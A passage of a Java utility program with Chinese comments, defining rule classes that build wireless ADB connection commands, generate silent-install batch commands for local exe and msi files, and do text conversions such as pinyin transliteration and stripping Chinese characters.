			System.out.println("command_ContentList.size = " + command_ContentList.size());
			writeContentToFile(I9_Temp_Text_File, allCommand_InNotepad);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "读取当前目录的 exe  和 msi  输出 安装的 zbat_xxxx.bat 命令  测试静默安装命令 ";
		}

	}

	// 6位数字为 验证码code 5位数字为端口(两个) 三位数字为IP地址最后一位 组成ADB命令 进行输出
	class ADB_Wireless_WIFI_Rule_22 extends Basic_Rule {

		String pair_code_6tr = ""; // 配对的 6个peiduima

		String pair_port_5str = ""; // 配对码的 端口 5位数

		String adb_wireless_port_5str = ""; // adb 连接的 端口 5 位数

		String ipaddress_last_3str = ""; // IP地址的最后一个值

		String IP_Addpress_Pre_1 = "192.168.0.";
		String IP_Addpress_Pre_2 = "10.106.20.";

		boolean isAllSuccess = false;

		ADB_Wireless_WIFI_Rule_22(boolean mIsInputDirAsSearchPoint) {
			super(22);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		ADB_Wireless_WIFI_Rule_22() {
			super(22, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
//                ArrayList<String>  fixedStrArr =   add_system_out_Rule_21(fileItem);

				ArrayList<String> fixedStrArr = new ArrayList<String>();
				String fileContent = ReadFileContent(fileItem);
				fileContent = fileContent.replace("\n", " ");
				fileContent = fileContent.replace(IP_Addpress_Pre_1, " ");
				fileContent = fileContent.replace(IP_Addpress_Pre_2, " ");

				fixedStrArr.add("提示1: 手机和电脑 必须在 同一个 网络下才能完成 wireless adb 连接操作! ");
				pair_code_6tr = getDefineLengthDigital(fileContent, 6);
				if (pair_code_6tr == null) { // 一：if
					fixedStrArr.add("[1]->无法搜索到 6位 配对码");
				} else {
					fixedStrArr.add("[1]-> 6位配对码: " + pair_code_6tr);

					String fixed_1_content = fileContent.replace(pair_code_6tr, "");
					pair_port_5str = getDefineLengthDigital(fixed_1_content, 5);

					System.out.println("fixed_1_content = " + fixed_1_content);
					if (pair_port_5str == null) { // 一二：if
						fixedStrArr.add("[2]-> 无法搜索到 5位 配对端口码");
					} else {
						fixedStrArr.add("[2]-> 5位 配对端口码: " + pair_port_5str);

						String fixed_2_content = fixed_1_content.replace(pair_port_5str, "");

						System.out.println("fixed_2_content = " + fixed_2_content);
						adb_wireless_port_5str = getDefineLengthDigital(fixed_2_content, 5);

						if (adb_wireless_port_5str == null) { // 一二三：if
							fixedStrArr.add("[3]-> 无法搜索到 5位 连接端口码");
						} else {
							fixedStrArr.add("[3]-> 5位 连接端口码: " + adb_wireless_port_5str.replace("\n", ""));

							String fixed_3_content = fixed_2_content.replace(adb_wireless_port_5str, "").trim();

							ipaddress_last_3str = getDefineLengthDigital_Range(fixed_3_content, 3);
							System.out.println("fixed_3_content = " + fixed_3_content + "    ipaddress_last_3str="
									+ ipaddress_last_3str);
							if (ipaddress_last_3str == null) {
								fixedStrArr.add("[4]-> 无法搜索到 IP地址最后值(最多三位)");
							} else {
								fixedStrArr.add("[4]->IP地址最后值(最多三位): " + ipaddress_last_3str);
								isAllSuccess = true;

							}

						}
					}

				}

				if (isAllSuccess) {
					String IP_Address_1 = IP_Addpress_Pre_1 + ipaddress_last_3str;
					fixedStrArr.add("\n");
					fixedStrArr.add("═════════════════════IP前缀:" + IP_Addpress_Pre_1 + "【" + IP_Address_1 + "】"
							+ "═════════════════════");
					String adbCommand_1_1 = calcul_Wireless_ADB_Command(IP_Address_1, adb_wireless_port_5str,
							pair_code_6tr, pair_port_5str);
					String adbCommand_1_2 = calcul_Wireless_ADB_Command(IP_Address_1, pair_port_5str, pair_code_6tr,
							adb_wireless_port_5str);

					fixedStrArr.add("连接命令1: \n" + adbCommand_1_1);
					fixedStrArr.add("\n");
					fixedStrArr.add("连接命令2: \n" + adbCommand_1_2);

					String IP_Address_2 = IP_Addpress_Pre_2 + ipaddress_last_3str;
					fixedStrArr.add("\n");
					fixedStrArr.add("═════════════════════ IP前缀:" + IP_Addpress_Pre_2 + "【" + IP_Address_2 + "】"
							+ "═════════════════════");
					String adbCommand_2_1 = calcul_Wireless_ADB_Command(IP_Address_2, adb_wireless_port_5str,
							pair_code_6tr, pair_port_5str);
					String adbCommand_2_2 = calcul_Wireless_ADB_Command(IP_Address_2, pair_port_5str, pair_code_6tr,
							adb_wireless_port_5str);

					fixedStrArr.add("连接命令1: \n" + adbCommand_2_1);
					fixedStrArr.add("\n");
					fixedStrArr.add("连接命令2: \n" + adbCommand_2_2);
				}

				/*
				 *
				 * System.out.println("════════════"+"输出文件 Begin " + "════════════"); for (int j
				 * = 0; j < fixedStrArr.size(); j++) { System.out.println(fixedStrArr.get(j)); }
				 * System.out.println("════════════"+"输出文件 End "+"════════════");
				 *
				 */
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);

				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的每一行 都 转为 System.out.println(xx) 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		String calcul_Wireless_ADB_Command(String ipAddress, String port_5_ip, String pairCode_6, String pair_port_5) {
			String commandStr = "adb kill-server && " + "adb pair " + ipAddress + ":" + pair_port_5 + "  " + pairCode_6
					+ "  && " + " adb connect " + ipAddress + ":" + port_5_ip + " && " + " adb -s " + ipAddress + ":"
					+ port_5_ip + " shell ";
			commandStr = commandStr.replace("\n", "");
			return commandStr;
		}

		String getDefineLengthDigital_Range(String content, int digitalLength) {
			String resultStr = null;
			if (content == null || content.trim().length() < digitalLength) {
				System.out.println(" getDefineLengthDigital_Range  content=[" + content + "]  digitalLength="
						+ digitalLength + "  return null");
				return resultStr;
			}

			if (content.length() == digitalLength) {
				return content;
			}
			if (content.contains(" ")) {
				String[] strArr = content.split(" ");
				if (strArr == null || strArr.length == 0) {
					return resultStr;
				}
				System.out.println(" digitalLength = " + digitalLength + "   Content=\n" + content);
				System.out.println();
				for (int i = 0; i < strArr.length; i++) {
					System.out.println("split[" + i + "] = " + strArr[i]);
				}

				for (int i = 0; i < strArr.length; i++) {
					System.out.println("split[" + i + "] = " + strArr[i]);
					if (isNumeric(strArr[i]) && strArr[i].trim().length() <= digitalLength) {
						System.out.println("split[" + i + "] = " + strArr[i] + "  Selected!");
						return strArr[i];
					}

				}

			}

			return resultStr;
		}

		String getDefineLengthDigital(String content, int digitalLength) {
			String resultStr = null;
			if (content == null || content.trim().length() < digitalLength) {
				return resultStr;
			}

			if (content.contains(" ")) {
				String[] strArr = content.split(" ");
				if (strArr == null || strArr.length == 0) {
					return resultStr;
				}
				System.out.println(" digitalLength = " + digitalLength + "   Content=\n" + content);
				System.out.println();
				for (int i = 0; i < strArr.length; i++) {
					System.out.println("split[" + i + "] = " + strArr[i]);
				}

				for (int i = 0; i < strArr.length; i++) {
					System.out.println("split[" + i + "] = " + strArr[i]);
					if (isNumeric(strArr[i].trim()) && strArr[i].trim().length() == digitalLength) {
						System.out.println("split[" + i + "] = " + strArr[i] + "  Selected!");
						return strArr[i];
					}

				}

			}

			return resultStr;
		}

		@Override
		String simpleDesc() {
			return " WireLess_Debug 把 输入的四个参数 转为 无线 adb 连接的命令 1.IP地址 2.IP端口 3.6位配对码 4.配对端口";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class System_Out_Print_Rule_21 extends Basic_Rule {

		System_Out_Print_Rule_21(boolean mIsInputDirAsSearchPoint) {
			super(21);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		System_Out_Print_Rule_21() {
			super(21, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				ArrayList<String> fixedStrArr = add_system_out_Rule_21(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的每一行 都 转为 System.out.println(xx) 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "  把当前文件的每一行 都 转为 System.out.println(xx) 的内容 ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// 往 每行的加入占位符 开头加入 〖* 第一个空格前加入*
	class Cal_Install_Command_Rule_20 extends Basic_Rule {
		Cal_Install_Command_Rule_20(boolean mIsInputDirAsSearchPoint) {
			super(20);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;

		}

		Cal_Install_Command_Rule_20() {
			super(20, true);
		}

		ArrayList<File> getFileTypeList(File[] fileList, String type) {
			ArrayList<File> fliterList = new ArrayList<File>();
			if (fileList == null) {
				return fliterList;
			}
			for (int i = 0; i < fileList.length; i++) {
				if (fileList[i].getName().toLowerCase().endsWith(type.toLowerCase())) {
					fliterList.add(fileList[i]);
				}
			}
			return fliterList;
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			File dirFile = curInputFileList.get(0).getParentFile();
			File[] fileList = dirFile.listFiles();
			System.out.println("dirFile = " + dirFile + "        fileList = " + fileList.length);
			ArrayList<File> exeFileList = getFileTypeList(fileList, ".exe");
			ArrayList<File> msiFileList = getFileTypeList(fileList, ".msi");
			ArrayList<File> allOperationFile = new ArrayList<File>();
			if (exeFileList != null) {
				allOperationFile.addAll(exeFileList);
			}

			if (msiFileList != null) {
				allOperationFile.addAll(msiFileList);
			}

			if (allOperationFile.size() == 0) {
				System.out.println("当前没有 exe 和 msi 文件  程序 退出！");
				return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
			}
			System.out.println("allOperationFile.size = " + allOperationFile.size());

			allOperationFile.sort(new Comparator<File>() {
				@Override
				public int compare(File o1, File o2) {
					long modify1 = o1.lastModified();
					long modify2 = o2.lastModified();
					if (modify1 == modify2)
						return 0;
					return modify1 > modify2 ? -1 : 1;
				}
			});
			String curShellPath = dirFile.getAbsolutePath();
			ArrayList<String> command_ContentList = new ArrayList<String>();

			command_ContentList.add("@echo off");
			command_ContentList.add("Setlocal ENABLEDELAYEDEXPANSION");

			String str_pre_1 = "start /wait /min ";

//            String str_end_1 = " /S /Q /D=E:\\Temp_Install\\";

			String str_end_1 = " /S /Q /D=" + curShellPath + File.separator;

			String str_end_2 = " /quiet /norestart INSTALLDIR=\"" + curShellPath + "\\";

			String str_end_3 = " /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP-";
			for (int i = 0; i < allOperationFile.size(); i++) {
				File fileItem = allOperationFile.get(i);
				String fileName = fileItem.getName();
				String newFileName = fileName;
				String absPath = fileItem.getAbsolutePath();
				if (fileName.contains(" ")) {
					newFileName = fileName.replace(" ", "");
					tryReName(fileItem, newFileName);
					System.out.println("  空格改名 " + fileName + "   -->  " + newFileName);
					absPath = absPath.replace(fileName, newFileName);
				}
				File fileItem_new = new File(absPath);
				if (fileItem_new.exists()) {

					String fileName_Point = fileItem_new.getName();
					System.out.println("操作索引[" + i + "]  = " + fileName_Point);
					String nameStr_noPoint = getFileNameNoPoint(fileName_Point);

					String tip1 = "rem #### " + fileName_Point;
					String command1 = str_pre_1 + fileName_Point + " " + str_end_1 + nameStr_noPoint;

					String command2 = str_pre_1 + fileName_Point + " " + str_end_2 + nameStr_noPoint + "\"";

					String command3 = fileItem_new.getAbsolutePath() + str_end_3;
					command_ContentList.add(tip1);
					command_ContentList.add("echo  \"<type1_/S/Q/D> " + command1 + "\"");
					command_ContentList.add(command1);
					command_ContentList.add("");
					command_ContentList.add("echo  \" </quiet /norestart INSTALLDIR> " + command2 + "\"");
					command_ContentList.add(command2);
					command_ContentList.add("");
					command_ContentList
							.add("echo  \" </VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP->  " + command3 + "\"");
					command_ContentList.add(command3);
					command_ContentList.add("");

					command_ContentList.add("\n");
				}

			}

			System.out.println("command_ContentList.size = " + command_ContentList.size());
			writeContentToFile(I9_Temp_Text_File, command_ContentList);
			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 读取当前的 exe 和 msi 文件 输出两种对应的安装命令 方便测试! ";
		}

	}

	/*
	 * @echo off Setlocal ENABLEDELAYEDEXPANSION start /wait /min
	 * Git-2.30.0-64-bit.exe /S /Q
	 * /D=D:\zbin_model\Software\ZWin_Software\E0_No_Slient_OneExe\git-2.30.0-64-bit
	 * if %errorlevel%==0 ( echo Git-2.30.0-64-bit.exe -- OK[type1_/S/Q/D] ) else (
	 * echo Git-2.30.0-64-bit.exe -- Error[type1_/S/Q/D] start /wait /min
	 * ./Git-2.30.0-64-bit.exe /quiet /norestart INSTALLDIR=
	 * "D:\zbin_model\Software\ZWin_Software\E0_No_Slient_OneExe\git-2.30.0-64-bit"
	 * if %errorlevel%==0 ( echo Git-2.30.0-64-bit.exe -- OK[type2_/quiet] ) else (
	 * echo Git-2.30.0-64-bit.exe -- Error[type2_/quiet]
	 * D:\zbin_model\Software\ZWin_Software\E0_No_Slient_OneExe\Git-2.30.0-64-bit.
	 * exe /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- if %errorlevel%==0 ( echo
	 * Git-2.30.0-64-bit.exe -- OK[type3_/VERYSILENT] ) else ( echo
	 * Git-2.30.0-64-bit.exe -- error[type1_type2_type3] ) ) )
	 */

	// 往 每行的加入占位符 开头加入 〖* 第一个空格前加入*
	class FirstWord_MakeDir_Rule_19 extends Basic_Rule {

		FirstWord_MakeDir_Rule_19(boolean mIsInputDirAsSearchPoint) {
			super(19);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;

		}

		FirstWord_MakeDir_Rule_19() {
			super(19, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				File curDirFile = fileItem.getParentFile();

				ArrayList<String> rawContentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedPathDir = fixedFirstWordPath(rawContentList);

				if (curDirFile != null) {
					for (int j = 0; j < fixedPathDir.size(); j++) {
						String dirName = fixedPathDir.get(j);
						String dirAbsPath = curDirFile.getAbsolutePath() + File.separator + dirName;
						File newDirTemp = new File(dirAbsPath);
						String fileName = newDirTemp.getName();
						boolean isDir = true;
						if (fileName.contains(".")) {
							try {
								isDir = false;
								newDirTemp.getParentFile().mkdirs();
								newDirTemp.createNewFile();
							} catch (IOException e) {
								e.printStackTrace();
							}
						} else {
							isDir = true;
							newDirTemp.mkdirs();
						}
						String filedesc = isDir ? " 目录" : "文件";
						System.out.println("创建 " + filedesc + "  " + newDirTemp.getAbsolutePath() + " 成功! ");
					}
					return null;
				} else {
					System.out.println("FirstWord_MakeDir_Rule_19   当前获取到的Shell目录为空!   无法创建 Z规则文件夹!  ");
				}

			}
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 读取文件中的每一行的空格前路径 并以此生成在当前文件目录生成指定目录";
		}

		ArrayList<String> fixedFirstWordPath(ArrayList<String> rawList) {
			ArrayList<String> fixedList = new ArrayList<String>();

			for (int i = 0; i < rawList.size(); i++) {
				String itemStr = rawList.get(i).trim();
				itemStr = itemStr.replace("\\", File.separator);
				itemStr = itemStr.replace("/", File.separator);
				itemStr = itemStr.replace("?", "");
				itemStr = itemStr.replace("!", "");
				itemStr = itemStr.replace("！", "");
				itemStr = itemStr.replace("？", "");
				itemStr = itemStr.replace("#", "");
				itemStr = itemStr.replace("@", "");
				itemStr = itemStr.replace("￥", "");
				itemStr = itemStr.replace("~", "");
				itemStr = itemStr.replace("&", "");
				itemStr = itemStr.replace("*", "");
				itemStr = itemStr.replace("|", "");
				itemStr = itemStr.replace("<", "");
				itemStr = itemStr.replace(">", "");
				itemStr = itemStr.replace("。", "");
				itemStr = itemStr.replace(",", "");
				itemStr = itemStr.replace("+", "");
				itemStr = itemStr.replace("\"", "");
				itemStr = itemStr.replace("：", "");
				itemStr = itemStr.replace(":", "");
				itemStr = itemStr.replace(File.separator + File.separator, File.separator);
				itemStr = itemStr.replace(File.separator + File.separator, File.separator);
				itemStr = itemStr.replace("\t", " ");
				if ("".equals(itemStr)) {
					continue;
				}
				if (itemStr.contains(" ")) {
					String[] arr = itemStr.split(" ");
					fixedList.add(arr[0]);
				} else {
					fixedList.add(itemStr);
				}
			}

			return fixedList;

		}

	}

	// 往 每行的加入占位符 开头加入 〖* 第一个空格前加入*
	class Add_BeginStr_EndStr_Rule_18 extends Basic_Rule {

		Add_BeginStr_EndStr_Rule_18(boolean mIsInputDirAsSearchPoint) {
			super(18);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;

		}

		Add_BeginStr_EndStr_Rule_18() {
			super(18, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);
				ArrayList<String> fixedStrArr = Tushare_TreeNodeData_Rule18(contentList);

				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index
						+ " -> 把tushare的数据 接口 转为 J0_treedata.txt 的 TreeNode 注意格式(直接复制表格)!  结点 [ 中文名 + 网址 ] 开头  File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把tushare的数据 接口 转为 J0_treedata.txt 的 TreeNode 注意格式(直接复制表格)!  结点 [ 中文名 + 网址 ] 开头 https://tushare.pro/document/2?doc_id=103  ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	// Rule_17 End 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构

	static ArrayList<File> rule17_resultFile_List = new ArrayList<File>();

	class Make_Json_As_JavaFile_Graphviz2Jpg_Rule_17 extends Basic_Rule {

		File targetFile_ResultDirFile; // 在 目标 .json 文件中生成的 放置 目标 图片 目标 .java 文件的目录

		Make_Json_As_JavaFile_Graphviz2Jpg_Rule_17(boolean mIsInputDirAsSearchPoint) {
			super(17);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		Make_Json_As_JavaFile_Graphviz2Jpg_Rule_17() {
			super(17, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				File parentFile = fileItem.getParentFile();
				String jsonFileName = fileItem.getName();

				targetFile_ResultDirFile = new File(parentFile.getAbsolutePath() + File.separator
						+ jsonFileName.replace(".", "_") + "_" + getTimeStamp());
				if (CUR_OS_TYPE == OS_TYPE.Windows) {
					Make_Json_As_JavaFile_Rule_17(fileItem, targetFile_ResultDirFile);
				} else if (CUR_OS_TYPE == OS_TYPE.MacOS) {
					System.out.println("无法在 Linux下实现  没有notepad++ 啊! ");
					System.out.println("无法实现对 Windows下 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构 (B6)");
				} else if (CUR_OS_TYPE == OS_TYPE.Linux) {
					System.out.println("无法在 Linux下实现  没有notepad++ 啊! ");
					System.out.println("无法实现对 Windows下 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构 (B6)");

				}

			}
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " Windows下 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构 (B6)";
		}

	}

	class ReadStrFromFile_Rule_24 extends Basic_Rule {

		ReadStrFromFile_Rule_24(boolean mIsInputDirAsSearchPoint) {
			super(24);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		ReadStrFromFile_Rule_24() {
			super(24, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				if (CUR_OS_TYPE == OS_TYPE.Windows) {
					ReadStrFromFile_Rule_16(fileItem);
				} else {
					System.out.println("无法在 Linux 和 MacOS 下实现  没有notepad++ 啊! ");
				}

			}
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " Windows下 读物当前文件内容 并 播放 vbs 声音 (B3)";
		}

	}

	// Rule_15 Begin 读取文件的第一行转为 二维码显示出来 B1
//    public static void TextAs_QrCode_Rule_15(File srcFile) {

	class TextAs_QrCode_Rule_15 extends Basic_Rule {

		TextAs_QrCode_Rule_15(boolean mIsInputDirAsSearchPoint) {
			super(15);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		TextAs_QrCode_Rule_15() {
			super(15, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				if (CUR_OS_TYPE == OS_TYPE.Windows) {
					TextAs_QrCode_Rule_15_Win(fileItem);
				} else if (CUR_OS_TYPE == OS_TYPE.MacOS) {
					// 实现 Mac 下 显示 二维码
					TextAs_QrCode_Rule_15_Mac(fileItem);

				} else if (CUR_OS_TYPE == OS_TYPE.Linux) {
					System.out.println("无法在 Linux  下实现  没有notepad++ 啊! ");
				}

			}
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 读取文件的第一行转为 二维码 QrCode 显示出来 (B1)";
		}

	}

	// // Rule_14 Begin 汉字转换为拼音 周 zhou 中国 zhong_guo (A9)
	// public static ArrayList<String> Chinese_To_PinYin_Rule_14(File srcFile) {

	class Chinese_To_PinYin_Rule_14 extends Basic_Rule {

		Chinese_To_PinYin_Rule_14(boolean mIsInputDirAsSearchPoint) {
			super(14);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		Chinese_To_PinYin_Rule_14() {
			super(14, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixedStrArr = Chinese_To_PinYin_Rule_14(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->汉字转换为拼音   周 zhou   中国 zhong_guo  (A9)   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 汉字转换为拼音   周 zhou   中国 zhong_guo  (A9)";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class ClearChinese_Rule_13 extends Basic_Rule {

		ClearChinese_Rule_13(boolean mIsInputDirAsSearchPoint) {
			super(13);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
		}

		ClearChinese_Rule_13() {
			super(13, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

				ArrayList<String> fixedStrArr = clearChinese_Rule_13(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->去除掉当前文件中的中文 每一个中文 以一个空格代替 （A7)   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 去除掉当前文件中的中文 每一个中文 以一个空格代替 （A7) ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
